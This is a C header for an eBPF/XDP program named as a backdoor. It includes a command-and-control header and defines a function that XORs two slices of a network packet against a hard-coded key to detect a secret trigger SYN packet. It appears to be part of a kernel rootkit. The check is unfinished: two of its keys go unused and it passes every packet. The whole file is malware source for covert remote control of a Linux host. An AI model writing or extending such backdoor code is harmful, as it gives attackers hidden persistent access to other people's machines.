#ifndef __BPF_BACKDOOR
#define __BPF_BACKDOOR

#include "headervmlinux.h"

#include <bpf/bpf_helpers.h>
#include "../../common/c&c.h"

static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 payload_size){
    char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN]; 
    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];

    //Undoing the trigger secret packet to check it is the one expected

    //Loading keys
    __builtin_memcpy(key1, CC_TRIGGER_SYN_PACKET_KEY_1, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(key2, CC_TRIGGER_SYN_PACKET_KEY_2, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3, CC_TRIGGER_SYN_PACKET_SECTION_LEN);

    //S1 XOR K1
    __builtin_memcpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section2, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result[ii] = section[ii] ^ section2[ii];
        if(result[ii]!=key1[ii]){
            bpf_printk("FAIL\n");
        }
    }
    bpf_printk("Finished V1 check\n");

    return XDP_PASS;

    



}

#endif